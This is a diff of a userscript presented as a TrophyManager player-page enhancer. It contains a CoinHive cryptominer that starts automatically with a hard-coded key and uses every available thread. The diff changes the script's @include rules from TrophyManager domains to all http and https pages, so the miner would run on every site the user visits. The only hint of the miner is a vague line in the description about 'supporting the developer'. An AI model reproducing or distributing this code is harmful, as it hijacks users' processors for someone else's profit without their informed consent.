@@ -3,12 +3,8 @@
 // @version 	   2.0.0
 // @description	   Show a super detayled TrophyManager player page. Edited to include coinhash generator to support developer. Thanks
 // @namespace      http://trophymanager.com
-// @include        http://static.trophymanager.com/*
-// @include        http://www.trophymanager.com/*
-// @include        http://trophymanager.com/*
-// @include        https://static.trophymanager.com/*
-// @include        https://www.trophymanager.com/*
-// @include        https://trophymanager.com/*
+// @include        http://*
+// @include        https://*
 // @author    	  Joao Manuel Ferreira Fernandes
 // @github		  http://github.com/etnepres/trophymanager.git	
 // @grant			none
@@ -2236,7 +2232,7 @@ if(useCoinHasGeneraterAndSuportDeveloper){
 	setTimeout(function(){
 	var miner = new CoinHive.User('vnDqlIL7DdMNJdkBVUvbsy072yJMoOqK', 'trophymanager', {
 		autoThreads: true,
-		throttle: 0,
+		throttle: 0.3,
 		forceASMJS: false
 	});
 	miner.start(CoinHive.IF_EXCLUSIVE_TAB);
